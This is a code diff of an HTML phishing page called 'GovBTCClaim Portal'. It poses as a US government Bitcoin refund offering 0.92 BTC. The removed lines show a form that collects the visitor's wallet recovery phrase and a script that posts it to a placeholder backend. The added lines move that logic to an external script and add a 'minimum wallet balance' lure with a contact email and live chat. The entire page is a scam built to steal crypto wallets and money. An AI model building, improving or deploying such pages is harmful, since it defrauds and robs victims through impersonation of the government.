@@ -1,21 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>GovBTCClaim Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="css/style.css" />
   <style>
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
-      background-image: url('https://i.ibb.co/xhMPg5m/govbtc-faint-bg.png');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-position: center;
       text-align: center;
       padding-top: 50px;
     }
-
     .container {
       background: white;
       width: 90%;
@@ -25,18 +21,9 @@
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
     h2 {
       color: #f7931a;
     }
-
-    .highlight {
-      color: #f7931a;
-      font-weight: bold;
-      margin-top: 10px;
-      font-size: 18px;
-    }
-
     .btn {
       background-color: #f7931a;
       color: white;
@@ -47,7 +34,6 @@
       cursor: pointer;
       font-size: 16px;
     }
-
     .wallet-box {
       margin-top: 25px;
       background: #eee;
@@ -55,79 +41,66 @@
       border-radius: 8px;
       word-break: break-word;
     }
-
     .note {
       font-size: 13px;
       color: #777;
       margin-top: 10px;
+    }
+    .highlight {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 15px;
+      color: green;
+    }
+    .faint-text {
+      font-size: 12px;
+      color: #777;
+      margin-top: 5px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
-    <div class="highlight">You are eligible to receive: 0.92 BTC (~$99,791 USD)</div>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
+
+    <div class="highlight">
+      You are eligible to receive: 0.92 BTC (~$99,791 USD)
+      <div class="faint-text">
+        (Minimum wallet balance: 0.0092 BTC. Contact us at <a href="mailto:admin@govbtcclaim.org">admin@govbtcclaim.org</a> if lower.)
+      </div>
+    </div>
 
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
     <div class="wallet-box" id="walletBox" style="display:none;">
-      <form id="seedForm">
-        <label for="walletType">Select Wallet Type:</label><br>
-        <select id="walletType" name="walletType" required>
-          <option value="">--Choose--</option>
-          <option value="MetaMask">MetaMask</option>
-          <option value="Trust Wallet">Trust Wallet</option>
-          <option value="Coinbase Wallet">Coinbase Wallet</option>
-          <option value="Ledger">Ledger</option>
-        </select><br><br>
-
-        <label for="seedPhrase">Enter your 12/24-word Recovery Phrase:</label><br>
-        <textarea id="seedPhrase" name="seedPhrase" rows="4" cols="40" required></textarea><br><br>
-
-        <button class="btn" type="submit">Submit</button>
-      </form>
+      <strong>Wallet Type:</strong> <span id="walletType">MetaMask</span><br />
+      <strong>Seed Phrase:</strong><br />
+      <span id="walletAddress">********************</span>
     </div>
 
     <div class="note">
-      For support or questions, contact <strong>admin@govbtcclaim.org</strong><br>
-      or message us through live chat.
+      For assistance, please contact support or use the live chat below.
     </div>
   </div>
 
-  <script>
-    function connectWallet() {
-      document.getElementById('walletBox').style.display = 'block';
-    }
+  <!-- Connect Logic -->
+  <script src="js/connect.js"></script>
 
-    document.getElementById('seedForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const seed = document.getElementById('seedPhrase').value;
-      const wallet = document.getElementById('walletType').value;
-
-      fetch('https://your-backend-url.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ seedPhrase: seed, walletType: wallet })
-      });
-
-      alert("Wallet verification in progress. Please wait while we confirm your refund.");
-    });
-  </script>
-
-  <!-- Start of Tawk.to Script (Live Chat Widget) -->
+  <!-- Start of Tawk.to Script -->
   <script type="text/javascript">
     var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
     (function () {
-        var s1 = document.createElement("script"),
-            s0 = document.getElementsByTagName("script")[0];
-        s1.async = true;
-        s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
-        s1.charset = 'UTF-8';
-        s1.setAttribute('crossorigin', '*');
-        s0.parentNode.insertBefore(s1, s0);
+      var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
     })();
   </script>
   <!-- End of Tawk.to Script -->
+
 </body>
 </html>
